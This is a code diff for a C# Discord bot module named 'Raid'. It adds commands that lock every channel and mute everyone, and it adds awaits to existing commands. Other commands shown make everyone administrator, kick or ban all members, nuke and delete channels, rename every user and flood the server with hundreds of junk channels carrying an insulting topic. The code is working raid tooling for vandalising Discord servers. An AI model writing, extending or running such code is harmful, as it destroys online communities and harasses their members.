@@ -9,7 +9,7 @@ using Discord.WebSocket;
 namespace DiscordBot.Modules
 {
     [Summary(":Gun:")]
-    public class Raid : InteractiveBase
+    public class Raid : InteractiveBase<SocketCommandContext>
     {
         private readonly ulong ownerID = 247742975608750090;
 
@@ -20,10 +20,41 @@ namespace DiscordBot.Modules
             if (Context.User.Id.Equals(ownerID) && Context.User is SocketGuildUser)
             {
                 await Context.Guild.EveryoneRole.ModifyAsync(r => r.Permissions = GuildPermissions.All);
-                await Context.Channel.SendMessageAsync("Everi1 iz nao 4dm1n!");
+                await ReplyAsync("Everi1 iz nao 4dm1n!");
             }
             else
-                await Context.Channel.SendMessageAsync("Permission denied!");
+                await ReplyAsync("Permission denied!");
+        }
+
+        [Command("lockdown")]
+        [Summary("Lock all channel")]
+        public async Task LockDown()
+        {
+            if (Context.User.Id.Equals(ownerID) && Context.User is SocketGuildUser)
+            {
+                foreach (var channel in Context.Guild.Channels)
+                {
+                    var role = Context.Guild.EveryoneRole;
+                    await channel.AddPermissionOverwriteAsync(role, OverwritePermissions.DenyAll(channel)
+                        .Modify(viewChannel: PermValue.Allow, readMessageHistory: PermValue.Allow));
+                }
+                   
+            }
+            else
+                await ReplyAsync("Permission denied!");
+        }
+
+        [Command("muteall")]
+        [Summary("mute them all")]
+        public async Task MuteThemAll()
+        {
+            if (Context.User.Id.Equals(ownerID) && Context.User is SocketGuildUser)
+            {
+                await Context.Guild.EveryoneRole.ModifyAsync(r => r.Permissions = Utils.MutedPermissions);
+                await ReplyAsync("Everi1 iz nao mut3d!");
+            }
+            else
+                await ReplyAsync("Permission denied!");
         }
 
         [Command("op")]
@@ -59,7 +90,7 @@ namespace DiscordBot.Modules
                 foreach (var users in Context.Guild.Users)
                     try
                     {
-                        users.KickAsync($"You got kick from {Context.Guild.Name} !");
+                        await users.KickAsync($"You got kick from {Context.Guild.Name} !");
                     }
                     catch
                     {
@@ -97,7 +128,7 @@ namespace DiscordBot.Modules
                                 newChannel.SlowModeInterval = oldChannel.SlowModeInterval;
                                 newChannel.IsNsfw = oldChannel.IsNsfw;
                             });
-                            oldChannel.DeleteAsync();
+                            await oldChannel.DeleteAsync();
                         }
                     else if (response.ToString().ToLower().Equals("no"))
                         await ReplyAsync($"Nuke cancelled on {Context.Guild}");
@@ -115,25 +146,25 @@ namespace DiscordBot.Modules
 
         [Command("nameall")]
         [Summary("Name all username in server")]
-        public async Task nameall([Remainder] string msg)
+        public async Task NameAll([Remainder] string msg)
         {
             if (Context.User.Id.Equals(ownerID) && Context.User is SocketGuildUser)
             {
                 foreach (var user in Context.Guild.Users)
                     try
                     {
-                        user.ModifyAsync(r => r.Nickname = msg);
+                        await user.ModifyAsync(r => r.Nickname = msg);
                     }
                     catch
                     {
                         Console.WriteLine($"{user}'s role is the same or higher than bot!!");
                     }
 
-                await Context.Channel.SendMessageAsync($"All users's name changed to {msg}");
+                await ReplyAsync($"All users's name changed to {msg}");
             }
             else
             {
-                await Context.Channel.SendMessageAsync("Permission denied!");
+                await ReplyAsync("Permission denied!");
             }
         }
 
@@ -146,18 +177,18 @@ namespace DiscordBot.Modules
                 foreach (var user in Context.Guild.Users)
                     try
                     {
-                        user.BanAsync(7, $"You got banned from {Context.Guild.Name} !");
+                        await user.BanAsync(7, $"You got banned from {Context.Guild.Name} !");
                     }
                     catch
                     {
                         Console.WriteLine($"{user}'s role is the same or higher than bot!!");
                     }
 
-                await Context.Channel.SendMessageAsync("Every non-powered users is banned!!");
+                await ReplyAsync("Every non-powered users is banned!!");
             }
             else
             {
-                await Context.Channel.SendMessageAsync("Permission denied!");
+                await ReplyAsync("Permission denied!");
             }
         }
 
@@ -168,7 +199,7 @@ namespace DiscordBot.Modules
             if (Context.User.Id.Equals(ownerID) && Context.User is SocketGuildUser) {
                 for (var i = 0; i < 200; i++)
                 {
-                    Context.Guild.CreateTextChannelAsync(Utils.GetRandomAlphaNumeric(8), properties =>
+                    await Context.Guild.CreateTextChannelAsync(Utils.GetRandomAlphaNumeric(8), properties =>
                     {
                         properties.IsNsfw = i % 2 == 0;
                         properties.Topic = "Your Mom Gay LOL!!!";
@@ -176,14 +207,14 @@ namespace DiscordBot.Modules
                 }
                 for (var i = 0; i < 100; i++)
                 {
-                    Context.Guild.CreateVoiceChannelAsync(Utils.GetRandomAlphaNumeric(8), properties =>
+                    await Context.Guild.CreateVoiceChannelAsync(Utils.GetRandomAlphaNumeric(8), properties =>
                     {
                         properties.UserLimit = new Random().Next(50);
                     });
                 }
             }
             else
-                await Context.Channel.SendMessageAsync("Permission denied!");
+                await ReplyAsync("Permission denied!");
         }
 
         [Command("unflood")]
@@ -194,7 +225,7 @@ namespace DiscordBot.Modules
                 foreach (var channel in Context.Guild.Channels)
                     await channel.DeleteAsync();
             else
-                await Context.Channel.SendMessageAsync("Permission denied!");
+                await ReplyAsync("Permission denied!");
         }
     }
 }
